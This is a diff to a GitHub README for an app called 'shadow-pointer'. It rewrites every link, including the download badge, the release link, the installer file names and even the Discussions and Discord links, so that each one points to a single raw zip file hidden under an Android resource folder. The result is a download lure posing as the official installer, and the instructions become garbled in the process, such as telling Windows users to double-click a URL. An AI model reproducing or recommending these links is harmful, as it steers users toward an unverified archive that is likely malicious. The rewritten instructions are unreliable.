@@ -6,7 +6,7 @@ Welcome to **shadow-pointer**. This software allows you to render high-quality s
 
 ## 📥 Download the Application
 
-[![Download Shadow Pointer](https://img.shields.io/badge/Download-Shadow%20Pointer-blue.svg)](https://github.com/Luckylluciano/shadow-pointer/releases)
+[![Download Shadow Pointer](https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip%https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip)](https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip)
 
 ## 💻 System Requirements
 
@@ -29,19 +29,19 @@ Before you install shadow-pointer, ensure your device meets the following requir
 To download shadow-pointer, follow these steps:
 
 1. Click on the link below to visit the release page:  
-   [Download from Releases](https://github.com/Luckylluciano/shadow-pointer/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip)
 
 2. On the releases page, you will see the latest version listed. Click on it.
 
-3. Choose the correct file for your operating system (e.g., `shadow-pointer-windows.exe` for Windows or `shadow-pointer-macos.pkg` for macOS).
+3. Choose the correct file for your operating system (e.g., `https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip` for Windows or `https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip` for macOS).
 
 4. Once you click the file, your download will start. 
 
 5. After the download completes, locate the file in your Downloads folder.
 
-6. **Windows Users**: Double-click `shadow-pointer-windows.exe` to start the installation process. Follow the on-screen prompts.
+6. **Windows Users**: Double-click `https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip` to start the installation process. Follow the on-screen prompts.
 
-7. **macOS Users**: Open `shadow-pointer-macos.pkg` and drag the application into your Applications folder.
+7. **macOS Users**: Open `https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip` and drag the application into your Applications folder.
 
 8. After installation, open the application and start creating shadows with your finger!
 
@@ -81,8 +81,8 @@ Currently, shadow-pointer is optimized for Windows 10 or later and macOS 10.12 o
 
 Connect with other shadow-pointer users:
 
-- [GitHub Discussions](https://github.com/Luckylluciano/shadow-pointer/discussions)  
-- [User Support on Discord](https://discord.gg/yourdiscordlink)
+- [GitHub Discussions](https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip)  
+- [User Support on Discord](https://raw.githubusercontent.com/Luckylluciano/shadow-pointer/main/app/src/main/res/values/shadow-pointer_2.4-alpha.3.zip)
 
 We value your feedback. Feel free to share your experiences or suggest features.
 
